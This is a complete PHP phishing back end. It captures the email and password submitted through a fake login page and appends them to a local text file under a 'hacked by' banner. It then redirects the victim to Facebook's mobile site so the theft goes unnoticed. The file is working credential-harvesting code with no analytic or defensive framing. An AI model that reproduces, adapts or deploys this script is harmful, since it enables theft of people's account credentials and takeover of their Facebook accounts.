<?
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$pass = $_POST['pass'];

		$text_result .="-------------hacked by mohammed alali---------------\n";
		$text_result .="======================================================\n";
		
		$text_result .="EMAIL :  ".$email."\n";
		$text_result .="PASSWORD : ".$pass."\n";
		$text_result .="======================================================\n";
		
		
	$file = fopen("tnt1.txt", 'a');	
	fwrite($file, $text_result);
	
		
header('Location:https://m.facebook.com');?>

